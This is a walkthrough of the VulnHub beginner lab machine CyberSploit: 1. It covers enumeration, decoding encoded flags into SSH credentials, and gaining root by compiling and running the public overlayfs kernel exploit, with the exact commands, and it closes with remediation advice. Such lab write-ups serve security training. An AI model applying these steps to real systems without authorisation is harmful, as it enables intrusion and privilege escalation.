# CyberSploit: 1 Write-up

> **Platform:** VulnHub, [CyberSploit: 1](https://www.vulnhub.com/entry/cybersploit-1,507/) **Machine:** CyberSploit: 1 **Difficulty:** Beginner **Operating System:** Ubuntu Linux **Author:** Ctum

---

## Overview

CyberSploit: 1 is a short, straightforward beginner box built around a simple flag-collection format. Each flag is encoded rather than exploited directly, using base64 and binary, and each one doubles as a piece of the credentials needed for the next step. The final privilege escalation relies on a well-known, outdated Linux kernel vulnerability rather than any web application flaw.

--
## Attack Path

1. Enumerated open services with Nmap.
2. Fuzzed the web server for hidden content and found a `robots.txt` file.
3. Decoded a base64 string from `robots.txt` to recover the first flag, which doubled as a password.
4. Found a username hidden in the page source.
5. Logged into SSH using the recovered username and password.
6. Found a binary-encoded string in the home directory and decoded it to recover the second flag.
7. Checked the kernel version and identified a known local privilege escalation vulnerability.
8. Compiled and ran a public exploit to escalate to root.
9. Retrieved the final flag.

---
## Initial Enumeration

Since this box doesn't require the IP address for most commands, I added it to my hosts file for convenience and scanned by hostname.

```bash
nmap -A -T5 cybersploit1
```

```text
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 (Ubuntu)
|_http-title: Hello Pentester!
```

Two open ports: SSH and an old version of Apache. The Apache version alone was old enough to be worth remembering, but I continued enumeration before assuming anything about it directly.

---
## Web Enumeration

```bash
ffuf -u http://cybersploit1/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -fc 404
```

This turned up a `robots.txt` file. Nothing else of note was found.

---
## Flag 1: Decoding robots.txt

The contents of `robots.txt` were a single base64-encoded string:

```text
R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9
```

Decoding it (via CyberChef) revealed the first flag:

```text
Good Work!
Flag1: cybersploit{youtube.com/c/cybersploit}
```

The flag's format, wrapped in curly braces, looked less like a trophy and more like a credential, so I kept it rather than treating it as a finished objective.

---
## Finding a Username

Checking the page source of the site turned up a commented-out username:

```html
<!-------------username:itsskv--------------------->
```

Combined with the decoded flag, this gave a full credential pair:

```text
Username: itsskv
Password: cybersploit{youtube.com/c/cybersploit}
```

There was no login form anywhere on the site, which meant the only place these credentials could reasonably apply was SSH.

---
## Gaining Shell Access

```bash
ssh itsskv@cybersploit1
```

The credentials worked immediately.

---
## Flag 2: Binary in the Home Directory

Listing the home directory revealed a second encoded flag, this time in binary rather than base64:

```text
01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010 01101011 00100000 00100001 ...
```

Decoding it (again via CyberChef) produced:

```text
good work!
flag2: cybersploit{https:t.me/cybersploit1}
```

Following the same pattern as before, this looked like another credential rather than a final objective, so I set it aside and continued enumerating the system for a privilege escalation path.

---
## Privilege Escalation

With flags 1 and 2 in hand but no obvious place left to use them as credentials, I moved to standard local enumeration: checking SUID/SGID binaries, sudo permissions, and the kernel version.

```bash
uname -r
```

```text
3.13.0-32-generic
```

This kernel version is old enough to be a known target. A quick search on Exploit-DB confirmed a matching, well-documented vulnerability:

```text
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
```
---
## Exploiting the Kernel

```bash
searchsploit -m linux/local/37292.c
```

I transferred the exploit source to the target over the existing SSH session:

```bash
scp 37292.c itsskv@cybersploit1:/tmp/
```

The exploit source file included its own compile and run instructions in comments, so no separate research was needed:

```bash
gcc 37292.c -o ofs
chmod +x ofs
./ofs
```

Running it escalated straight to root.

---
## Final Flag

```bash
cd /root
```

```text
congratulations

flag3: cybersploit{Z3X21CW42C4 many many congratulations!}

if you like it share with me https://twitter.com/cybersploit1.

Thanks!
```

Machine complete.

---
## Flags Summary

|Flag|Location|How It Was Found|
|---|---|---|
|1|`robots.txt` (base64 encoded)|Decoded to reveal a password, paired with a username in the page source|
|2|Home directory (binary encoded)|Decoded after gaining SSH access as `itsskv`|
|3 (final)|`/root`|Retrieved after kernel exploit privilege escalation|

---
## Remediation

- **Do not use `robots.txt` or HTML comments to store credentials or credential fragments**, encoded or otherwise. Both are trivially readable by anyone who checks them, encoding is not a substitute for actual access control.
- **Never leave usernames or partial credentials in page source comments.** This is functionally equivalent to publishing them outright.
- **Enforce SSH account lockout or rate limiting** to slow down credential-based login attempts, even when the credentials themselves are strong.
- **Keep the Linux kernel patched.** The overlayfs privilege escalation used here is a long-known, publicly documented vulnerability with no reason to still be exploitable on a properly maintained system.
- **Restrict compiler availability (`gcc`) on production systems** where it is not operationally required. Its presence made compiling and running the exploit trivial once shell access was gained.

---
## Lessons Learned

- Not every encoded string is a dead end or a red herring. Both flags here doubled as functional credentials once decoded, which meant treating "solved" flags as still potentially useful was the right call.
- `robots.txt` remains worth checking on every engagement, even on a simple box. It is one of the first places to look for anything a site owner didn't want indexed but still left accessible.
- HTML source comments are an easy, often-overlooked place to check manually, especially once one hint (like an encoded flag) suggests the box is built around a deliberate discovery pattern.
- Kernel version checks should be routine and early in the privilege escalation process, not a last resort. An old kernel version is often the single biggest clue on the entire box.

---
## Tools Used

- Nmap
- ffuf
- CyberChef
- SSH
- Searchsploit
- GCC

---
## Technologies Encountered

- Apache 2.2.22
- OpenSSH 5.9p1
- Ubuntu Linux
- Linux kernel 3.13.0

---
## Skills Practiced

- Network Enumeration
- Web Content Discovery
- Encoding and Decoding (Base64, Binary)
- Credential Discovery
- SSH Access
- Linux Kernel Privilege Escalation